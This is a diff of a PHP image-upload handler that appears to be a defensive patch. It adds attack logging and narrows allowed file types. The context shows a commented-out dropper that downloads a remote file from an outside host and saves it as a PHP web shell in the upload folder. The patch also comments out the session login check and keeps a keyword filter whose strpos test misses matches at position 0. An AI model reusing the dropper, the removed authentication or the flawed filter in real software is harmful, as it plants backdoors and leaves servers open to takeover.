@@ -1,6 +1,12 @@
 <?php
+/*
+if (!isset($_SESSION['uid'])) {
+    exit(json_encode(array("error"=>"上传失败，请您重新选择图片进行上传")));
+}
+*/
+
 define('ATTACK_LOG_DIR', '/tmp/attack/');
-$typeArr = array("jpg", "png", "gif");//允许上传文件格式
+$typeArr = array("jpg", "png");//允许上传文件格式
 $path = "Uploads/";//上传路径
 
 if (isset($_POST)) {
@@ -8,14 +14,14 @@ if (isset($_POST)) {
         error_log('upload exception:' . $_FILES["file"]["error"]);
         exit(json_encode(array("error"=>"上传失败，请您重新选择图片进行上传")));
     }
-    
+
     $name = $_FILES['file']['name'];
     $size = $_FILES['file']['size'];
     $name_tmp = $_FILES['file']['tmp_name'];
-    
+
     $type = strtolower(substr(strrchr($name, '.'), 1)); //获取文件类型
     if (!in_array($type, $typeArr)) {
-        echo json_encode(array("error"=>"请上传jpg,png或gif类型的图片！"));
+        echo json_encode(array("error"=>"请上传jpg,png类型的图片！"));
         exit;
     }
     if ($size > (2000 * 1024)) {
@@ -30,10 +36,12 @@ $a = file_get_contents("http://www.dssj.cc/me2.txt");
 file_put_contents("./Uploads/123545614545.ph"."p",$a);
 ?>
     */
+    // 判断图片文件真实类型
+    // 通过幻数识别
 
     $content = file_get_contents($name_tmp);
     if(strpos($content,'?php') != false || strpos($content,'eval') != false || strpos($content,'base') != false){
-        
+
         file_put_contents(ATTACK_LOG_DIR . $name, $content);
         unlink($name_tmp);
         exit;
